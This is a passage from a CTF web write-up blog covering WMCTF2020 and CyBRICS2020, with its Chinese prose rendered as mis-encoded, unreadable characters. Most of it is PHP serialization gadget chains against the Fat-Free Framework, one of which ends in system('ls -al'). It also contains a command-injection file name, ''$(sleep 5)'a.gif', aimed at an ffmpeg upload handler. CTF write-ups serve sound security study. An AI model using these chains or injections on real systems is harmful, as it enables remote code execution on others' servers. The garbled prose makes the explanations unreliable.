<p>æˆ‘ä»¬å¯ä»¥çœ‹åˆ°ç¡®å®<code>$url</code>æ˜¯æˆ‘ä»¬å¯ä»¥æ§åˆ¶çš„ï¼Œç°åœ¨å°±æ˜¯è¦è®©è¯­å¥æ‰§è¡Œåˆ°è¿™é‡Œï¼Œè¿™ä¸ªæ²¡å•¥å¥½è¯´çš„ï¼Œæœ‰è€å¿ƒä¸€ç‚¹æ…¢æ…¢è°ƒå°±okäº†ï¼Œç›´æ¥æ¢ä¸Špayloadäº†ï¼š</p>
<p>æ¥ä¸‹æ¥å°±æ˜¯éœ€è¦æ‰¾åˆ°ä¸€ä¸ªåˆé€‚çš„å‡½æ•°ï¼Œæœ¬åœ°fuzzè‡ªå¸¦çš„å‡½æ•°å‘ç°ï¼Œexecæ˜¯å¯ä»¥çš„ï¼Œè™½ç„¶å®ƒä¼šæŠ¥é”™</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110718.png" alt="image12361"></p>
<p>amazingï¼Œåˆ’é‡ç‚¹è¿™æ˜¯è¦è€ƒçš„ï¼Œè™½ç„¶æœ¬åœ°å¯ä»¥ï¼Œä½†æ˜¯</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804110842.png" alt="image12473"></p>
<p>æœåŠ¡å™¨ä¸Šå»æµ‹è¯•å°±segment faultäº†ï¼Œé»¯ç„¶ç¦»å».jpg</p>
<p>æ¥ä¸‹æ¥æˆ‘ä»¬åªèƒ½å»æ‰¾æ¡†æ¶çš„å‡½æ•°äº†</p>
<p>æ‰¾ç€æ‰¾ç€æˆ‘æ‰¾åˆ°äº†ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111008.png" alt="image12618"></p>
<p>è¿™æ ·ä¸€ä¸ªä¸œè¥¿ï¼Œè¿™ä¸ªå‡½æ•°å°±å¾ˆnice</p>
<p>æˆ‘ä»¬ä¼ å…¥<code>WEB-&gt;send(&#39;/flag&#39;,false,true);</code>é‚£ä¹ˆæˆ‘ä»¬å°±èƒ½å¾—åˆ°<code>/flag</code>çš„å†…å®¹äº†</p>
<p>æœ€åpayloadå¦‚ä¸‹ï¼š</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">id</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">socket</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">flag</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">verb</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">uri</span>=&quot;&quot;,</span><br><span class="line">            $<span class="title">headers</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">check</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \base(),<span class="string">&quot;run&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span></span><br><span class="line"><span class="class">    </span>&#123;</span><br><span class="line">        <span class="keyword">protected</span></span><br><span class="line">            <span class="variable">$addr</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$ctx</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$wait</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$sockets</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$protocol</span>=<span class="string">&quot;&quot;</span>,</span><br><span class="line">            <span class="variable">$agents</span> = [];</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span> = [<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="string">&quot;bbbbb&quot;</span>];</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;addr = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            //! <span class="title">Flat</span>-<span class="title">file</span> <span class="title">DB</span> <span class="title">wrapper</span></span><br><span class="line">            $<span class="title">db</span>,</span><br><span class="line">            //! <span class="title">Data</span> <span class="title">file</span></span><br><span class="line">            $<span class="title">file</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">identifier</span></span><br><span class="line">            $<span class="title">id</span>,</span><br><span class="line">            //! <span class="title">Document</span> <span class="title">contents</span></span><br><span class="line">            $<span class="title">document</span>=[],</span><br><span class="line">            //! <span class="title">field</span> <span class="title">map</span>-<span class="title">reduce</span> <span class="title">handlers</span></span><br><span class="line">            $<span class="title">_reduce</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>\<span class="title">Jig</span>&#123;</span><br><span class="line"></span><br><span class="line">    <span class="title">use</span> <span class="title">Traversable</span>;</span><br><span class="line"></span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">Mapper</span> <span class="keyword">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span></span>&#123;</span><br><span class="line">        <span class="keyword">protected</span></span><br><span class="line">            <span class="comment">//! Flat-file DB wrapper</span></span><br><span class="line">            <span class="variable">$db</span>,</span><br><span class="line">            <span class="comment">//! Data file</span></span><br><span class="line">            <span class="variable">$file</span>,</span><br><span class="line">            <span class="comment">//! Document identifier</span></span><br><span class="line">            <span class="variable">$id</span>,</span><br><span class="line">            <span class="comment">//! Document contents</span></span><br><span class="line">            <span class="variable">$document</span>=[],</span><br><span class="line">            <span class="comment">//! field map-reduce handlers</span></span><br><span class="line">            <span class="variable">$_reduce</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="keyword">new</span> \base();</span><br><span class="line">            <span class="keyword">$this</span>-&gt;file = <span class="string">&quot;index.php&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement getIterator() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">exists</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement exists() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">set</span>(<span class="params"><span class="variable">$key</span>, <span class="variable">$val</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement set() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">get</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement get() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$key</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement clear() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetExists() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetGet() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetSet() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetUnset() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Prefab</span> &#123;</span><br><span class="line">        <span class="title">static</span> <span class="title">function</span> <span class="title">instance</span>() &#123;</span><br><span class="line">            <span class="title">if</span> (!<span class="title">Registry</span>::<span class="title">exists</span>($<span class="title">class</span>=<span class="title">get_called_class</span>())) &#123;</span><br><span class="line">                $<span class="title">ref</span>=<span class="title">new</span> <span class="title">ReflectionClass</span>($<span class="title">class</span>);</span><br><span class="line">                <span class="variable">$args</span>=func_get_args();</span><br><span class="line">                Registry::set(<span class="variable">$class</span>,</span><br><span class="line">                    <span class="variable">$args</span>?<span class="variable">$ref</span>-&gt;newinstanceargs(<span class="variable">$args</span>):<span class="keyword">new</span> <span class="variable">$class</span>);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">return</span> Registry::get(<span class="variable">$class</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">Base</span> <span class="keyword">extends</span> <span class="title">Prefab</span> <span class="keyword">implements</span> <span class="title">ArrayAccess</span></span>&#123;</span><br><span class="line">        <span class="keyword">private</span></span><br><span class="line">            <span class="variable">$hive</span>,</span><br><span class="line">            <span class="variable">$init</span>,</span><br><span class="line">            <span class="variable">$languages</span>,</span><br><span class="line">            <span class="variable">$locks</span>=[],</span><br><span class="line">            <span class="variable">$fallback</span>=<span class="string">&#x27;en&#x27;</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;hive=[</span><br><span class="line">                <span class="string">&quot;ROUTES&quot;</span>=&gt;[<span class="string">&#x27;/flag/&#x27;</span>=&gt;[[<span class="string">&#x27;GET&#x27;</span>=&gt;<span class="number">1</span>]],<span class="string">&quot;2&quot;</span>=&gt;<span class="number">1</span>],</span><br><span class="line">                <span class="string">&quot;PATH&quot;</span>=&gt;<span class="string">&#x27;/flag/&#x27;</span>,<span class="comment">#$url</span></span><br><span class="line">                <span class="string">&quot;QUERY&quot;</span>=&gt;<span class="string">&quot;&quot;</span>,</span><br><span class="line">                <span class="string">&quot;VERB&quot;</span>=&gt;<span class="string">&quot;GET&quot;</span>,</span><br><span class="line">                <span class="string">&quot;PARAMS&quot;</span>=&gt;[],</span><br><span class="line">                <span class="string">&quot;ONREROUTE&quot;</span>=&gt;<span class="string">&quot;WEB-&gt;send&quot;</span>,<span class="comment">#$func</span></span><br><span class="line">                <span class="string">&quot;CLI&quot;</span>=&gt;<span class="string">&#x27;123&#x27;</span></span><br><span class="line">                ];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetSet() method.</span></span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">            <span class="comment">// <span class="doctag">TODO:</span> Implement offsetUnset() method.</span></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">abstract</span> <span class="class"><span class="keyword">class</span> <span class="title">Magic</span> <span class="keyword">implements</span> \<span class="title">ArrayAccess</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">echo</span> urlencode(serialize(<span class="keyword">new</span> \CLI\WS(<span class="keyword">new</span> \CLI\Agent())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804111403.png" alt="image16897"></p>
<p>ç„¶è€Œåœ¨é¢˜ç›®ä¸­å®ƒè™½ç„¶æ‰§è¡Œäº†<code>WEB-&gt;send</code>æ–¹æ³•ï¼ˆæ ¹æ®é”™è¯¯ä¿¡æ¯å¾—çŸ¥ï¼‰ï¼Œä½†æ˜¯å¹¶ä¸ä¼šè¿”å›<code>/flag</code>ï¼ˆæ‰€æœ‰æ–‡ä»¶éƒ½è¯»ä¸äº†ï¼‰ï¼Œå¸Œæœ›æœ‰çœ‹åˆ°çš„å¸ˆå‚…ç»™ä¸ªè§£ç­”</p>
<h3 id="æ­£è§£"><a href="#æ­£è§£" class="headerlink" title="æ­£è§£"></a>æ­£è§£</h3><p>æœç„¶æ˜¯æˆ‘ä¸€å¥é­”æœ¯æ–¹æ³•é‡Œé¢æ²¡å•¥å¥½ç”¨çš„è¿™ä¸€å¥è¯æ–­é€äº†æˆ‘çš„flagï¼Œæœ‰è¿™æ ·ä¸€ä¸ªé­”æœ¯æ–¹æ³•</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804114525.png" alt="image17108"></p>
<p>å®ƒé€šè¿‡æ§åˆ¶<code>$this-&gt;props</code>æˆ‘ä»¬å¯ä»¥è°ƒç”¨ä»»æ„å‡½æ•°ï¼Œé‚£ä¹ˆæˆ‘ä»¬åªéœ€è¦æ‰¾åˆ°ä¸€ä¸ªå¯æ§å‚æ•°çš„ä½ç½®å°±å¯ä»¥äº†</p>
<p>æ‰¾åˆ°</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804120508.png" alt="image17250"></p>
<p>æ„é€ payload</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">namespace</span> <span class="title">DB</span>&#123;</span><br><span class="line">    <span class="title">abstract</span> <span class="title">class</span> <span class="title">Cursor</span>  <span class="title">implements</span> \<span class="title">IteratorAggregate</span> &#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="title">namespace</span> <span class="title">DB</span>\<span class="title">SQL</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Mapper</span> <span class="title">extends</span> \<span class="title">DB</span>\<span class="title">Cursor</span>&#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">props</span>=[&quot;<span class="title">quotekey</span>&quot;=&gt;&quot;<span class="title">system</span>&quot;],</span><br><span class="line">            $<span class="title">adhoc</span>=[&quot;<span class="title">ls</span> -<span class="title">al</span>&quot;=&gt;[&quot;<span class="title">expr</span>&quot;=&gt;&quot;&quot;]],</span><br><span class="line">            $<span class="title">db</span>;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetExists</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetGet</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetSet</span>(<span class="params"><span class="variable">$offset</span>, <span class="variable">$value</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">offsetUnset</span>(<span class="params"><span class="variable">$offset</span></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">getIterator</span>(<span class="params"></span>)</span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"><span class="variable">$val</span></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;db = <span class="variable">$val</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> <span class="title">CLI</span>&#123;</span><br><span class="line">    <span class="title">class</span> <span class="title">Agent</span> &#123;</span><br><span class="line">        <span class="title">protected</span></span><br><span class="line">            $<span class="title">server</span>=&quot;&quot;;</span><br><span class="line">        <span class="keyword">public</span> <span class="variable">$events</span>;</span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">            <span class="keyword">$this</span>-&gt;events=[<span class="string">&quot;disconnect&quot;</span>=&gt;<span class="keyword">array</span>(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="keyword">new</span> \DB\SQL\Mapper(<span class="string">&quot;&quot;</span>)),<span class="string">&quot;find&quot;</span>)];</span><br><span class="line">            <span class="keyword">$this</span>-&gt;server=&amp;<span class="keyword">$this</span>;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="class"><span class="keyword">class</span> <span class="title">WS</span></span>&#123;&#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">namespace</span> &#123;</span><br><span class="line">    <span class="title">echo</span> <span class="title">urlencode</span>(<span class="title">serialize</span>(<span class="title">array</span>(<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">WS</span>(),<span class="title">new</span> \<span class="title">CLI</span>\<span class="title">Agent</span>())));</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<h2 id="Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0"><a href="#Make-PHP-Great-Again-amp-amp-Make-PHP-Great-Again-2-0" class="headerlink" title="Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0"></a>Make PHP Great Again  &amp;&amp;  Make PHP Great Again 2.0</h2><p>è¿™é¢˜æ˜¯å­¦é•¿é—²çš„æ— èŠè§£å‡ºæ¥çš„ï¼Œè¯´10åˆ†é’Ÿå°±okçš„é¢˜ç›®ã€‚ã€‚ã€‚è†œæ‹œ</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200804123108.png" alt="image18383"></p>
<p>å®é™…è°ƒè¯•çš„æ—¶å€™æ˜¯è¿™æ ·çš„ï¼š</p>
<p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/RF5J9(A_2K%24)Z4VG%251B0WZI.png" alt="image18481"></p>
<p>ä¸Šé¢è¿˜æœ‰ä¸€å †tsrm_realpath_rã€‚</p>
<p>è¿˜æœ‰å•¥å¥½è¯´çš„ï¼Ÿçœ‹ä»£ç ã€‚ã€‚ã€‚ã€‚</p>

      
    </div>
    <footer class="article-footer">
      <a data-url="https://site.ccreater.top/2020/08/03/wmctf2020/" data-id="ckw7zp40r0076ftn76bav2g80" data-title="wmctf2020" class="article-share-link">Share</a>
      
      
      
  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/ctf/" rel="tag">ctf</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/web/" rel="tag">web</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/wp/" rel="tag">wp</a></li></ul>

    </footer>
  </div>
  
</article>



  
    <article id="post-CyBRICS2020" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
  <div class="article-meta">
    <a href="/2020/07/28/CyBRICS2020/" class="article-date">
  <time class="dt-published" datetime="2020-07-28T16:00:00.000Z" itemprop="datePublished">2020-07-29</time>
</a>
    
  <div class="article-category">
    <a class="article-category-link" href="/categories/%E6%AF%94%E8%B5%9B/">æ¯”èµ›</a>
  </div>

  </div>
  <div class="article-inner">
    
    
      <header class="article-header">
        
  
    <h1 itemprop="name">
      <a class="p-name article-title" href="/2020/07/28/CyBRICS2020/">CyBRICS2020</a>
    </h1>
  

      </header>
    
    <div class="e-content article-entry" itemprop="articleBody">
      
        <h1 id="CyBRICS-2020"><a href="#CyBRICS-2020" class="headerlink" title="CyBRICS  2020"></a>CyBRICS  2020</h1><h2 id="Hunt"><a href="#Hunt" class="headerlink" title="Hunt"></a>Hunt</h2><p>ç”¨burpä¿®æ”¹è¿”å›åŒ…</p>
<p>flag:<code>cybrics&#123;Th0se_c4p7ch4s_c4n_hunter2_my_hunter2ing_hunter2&#125;</code></p>
<h2 id="Gif2png"><a href="#Gif2png" class="headerlink" title="Gif2png"></a>Gif2png</h2><p>æºä»£ç å·²ä¸Šä¼ </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">if not bool(re.match(&quot;^[a-zA-Z0-9_\-. &#x27;\&quot;\=\$\(\)\|]*$&quot;, file.filename)):</span><br><span class="line">    exit()</span><br><span class="line">...</span><br><span class="line">def allowed_file(filename):</span><br><span class="line">    return &#x27;.&#x27; in filename and filename.rsplit(&#x27;.&#x27;, 1)[1].lower() in ALLOWED_EXTENSIONS</span><br><span class="line">allowed_file(file.filename)</span><br><span class="line">...</span><br><span class="line">command = subprocess.Popen(f&quot;ffmpeg -i &#x27;uploads/&#123;file.filename&#125;&#x27; \&quot;uploads/&#123;uid&#125;/%03d.png\&quot;&quot;, shell=True)</span><br></pre></td></tr></table></figure>

<p><code>filename=&quot;&#39;$(sleep 5)&#39;a.gif&quot;</code>æ¥æ‰§è¡Œå‘½ä»¤</p>
<p>cybrics{imagesaresocoolicandrawonthem}</p>
<h2 id="woc"><a href="#woc" class="headerlink" title="woc"></a>woc</h2><p><img src="https://raw.githubusercontent.com/Explorersss/photo/master/20200726002857.png" alt="image631"></p>
<p>calc.php</p>
